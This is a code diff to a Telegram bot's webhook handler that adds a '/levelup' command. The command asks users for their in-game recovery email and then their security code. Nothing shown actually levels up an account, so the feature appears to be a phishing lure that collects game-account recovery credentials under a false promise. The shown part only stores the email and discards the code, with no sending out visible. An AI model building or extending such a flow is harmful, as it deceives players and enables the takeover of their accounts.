@@ -181,7 +181,9 @@ async function handleHelp(chatId) {
 ▶️ /start
 ❓ /help
 ❤️ /like ind &lt;UID&gt;
-🔎 /get &lt;UID&gt;`,
+🔎 /get &lt;UID&gt;
+   /levelup
+   /level up`,
     {
       parse_mode: "HTML",
     }
@@ -479,6 +481,105 @@ export default async function handler(req, res) {
       return res.status(200).json({
         success: true,
       });
+    }
+
+
+    // ==========================================
+    // LEVEL UP COMMAND
+    // /levelup
+    // /level up
+    // ==========================================
+
+    const levelUpMatch = text.match(
+      /^\/level(?:up|\s+up)$/i
+    );
+
+    if (levelUpMatch) {
+      console.log("LEVEL UP COMMAND RECEIVED");
+
+      levelUpSessions[chatId] = {
+        step: "email",
+      };
+
+      await bot.sendMessage(
+        chatId,
+        "📧 Please send your in-game recovery email."
+      );
+
+      return res.status(200).json({
+        success: true,
+      });
+    }
+
+    // ==========================================
+    // LEVEL UP EMAIL / SECURITY CODE
+    // ==========================================
+
+    if (levelUpSessions[chatId]) {
+      const session = levelUpSessions[chatId];
+
+      // ------------------------------------------
+      // STEP 1: EMAIL
+      // ------------------------------------------
+
+      if (session.step === "email") {
+        const email = text.trim();
+
+        const emailRegex =
+          /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        if (!emailRegex.test(email)) {
+          await bot.sendMessage(
+            chatId,
+            "❌ Please send a valid email address."
+          );
+
+          return res.status(200).json({
+            success: true,
+          });
+        }
+
+        levelUpSessions[chatId] = {
+          step: "security_code",
+          email: email,
+        };
+
+        console.log(
+          "RECOVERY EMAIL RECEIVED"
+        );
+
+        await bot.sendMessage(
+          chatId,
+          "🔐 Please send your security code."
+        );
+
+        return res.status(200).json({
+          success: true,
+        });
+      }
+
+      // ------------------------------------------
+      // STEP 2: SECURITY CODE
+      // ------------------------------------------
+
+      if (session.step === "security_code") {
+        const securityCode = text.trim();
+
+        console.log(
+          "SECURITY CODE RECEIVED"
+        );
+
+        await bot.sendMessage(
+          chatId,
+          "✅ Security code received."
+        );
+
+        delete levelUpSessions[chatId];
+
+        return res.status(200).json({
+          success: true,
+        });
+      }
     }
 
     // ==========================================
